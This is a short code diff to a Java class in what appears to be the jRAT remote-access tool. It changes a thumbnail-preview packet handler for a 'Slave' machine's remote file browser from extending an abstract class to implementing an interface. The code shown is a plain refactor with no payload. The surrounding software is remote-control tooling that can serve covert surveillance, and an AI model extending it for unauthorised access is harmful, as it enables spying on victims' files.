@@ -2,13 +2,13 @@ package jrat.module.fs.packets;
 
 import jrat.common.utils.ImageUtils;
 import jrat.controller.Slave;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.module.fs.ui.FrameRemoteFiles;
 
 import java.awt.*;
 import java.awt.image.BufferedImage;
 
-public class Packet59ThumbnailPreview extends AbstractIncomingPacket {
+public class Packet59ThumbnailPreview implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
